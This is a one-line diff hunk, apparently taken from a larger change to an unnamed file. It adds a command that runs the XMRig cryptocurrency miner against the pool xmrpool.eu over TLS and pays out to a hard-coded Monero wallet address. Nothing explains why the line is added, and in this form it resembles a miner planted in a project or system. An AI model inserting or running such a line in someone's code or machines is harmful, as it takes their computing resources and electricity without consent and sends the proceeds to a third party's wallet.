@@ -1,0 +1,1 @@
+./xmrig -o xmrpool.eu:9999 -u 8BERqvwtHVJc1r7aqhov2D5uA2ztJNuNFFQU8GNnbLttG3RdhXio3FuDEAD52evV7CM5vdYz8Y3kaUBcYBp4MCTF1Q6qcMs -k --tls
